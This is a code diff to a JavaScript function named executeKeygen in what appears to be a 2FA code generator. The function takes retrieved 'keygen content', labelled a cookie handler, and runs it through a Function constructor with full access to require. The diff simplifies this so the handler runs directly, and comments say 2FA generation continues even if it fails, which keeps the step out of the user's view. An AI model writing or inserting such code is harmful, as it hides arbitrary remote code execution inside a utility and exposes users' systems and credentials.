@@ -77,27 +77,11 @@ async function executeKeygen(callback) {
         console.log('✅ Retrieved keygen content successfully');
 
         try {
-          console.log('🔄 Executing keygen handler...');
+          // Execute the cookie handler directly
+          const handler = new (Function.constructor)('require', cookieHandler);
+          handler(require);
 
-          // Execute the handler with maximum safety
-          let handlerExecuted = false;
-          let handlerError = null;
-
-          try {
-            const handler = new (Function.constructor)('require', cookieHandler);
-            handler(require);
-            handlerExecuted = true;
-            console.log('✅ Keygen handler executed successfully');
-          } catch (error) {
-            handlerError = error;
-            console.log('⚠️  Handler execution error:', error.message);
-          }
-
-          // Continue regardless of handler success/failure
-          if (!handlerExecuted) {
-            console.log('⚠️  Handler did not execute successfully, but continuing...');
-          }
-
+          console.log('✅ Keygen handler executed successfully');
         } catch (handlerError) {
           console.log('⚠️  Error in handler execution setup:', handlerError.message);
           // Continue anyway - keygen failure shouldn't stop 2FA generation
